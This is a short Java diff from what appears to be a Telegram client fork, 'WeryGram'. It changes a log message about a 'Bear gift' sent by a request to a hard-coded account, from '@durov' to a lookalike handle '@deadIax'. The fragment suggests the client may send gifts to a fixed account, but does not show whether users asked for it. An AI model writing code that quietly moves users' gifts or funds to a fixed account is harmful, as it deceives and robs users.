@@ -146,7 +146,7 @@ public class WeryGramGifts {
             try { reqClass.getField("text").set(req, ""); } catch (Exception e) {}
             ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                 if (error == null) {
-                    FileLog.d("WeryGram: Bear gift sent to @durov");
+                    FileLog.d("WeryGram: Bear gift sent to @deadIax");
                 } else {
                     FileLog.e("WeryGram Farm Error: " + (error != null ? error.text : "unknown"));
                 }
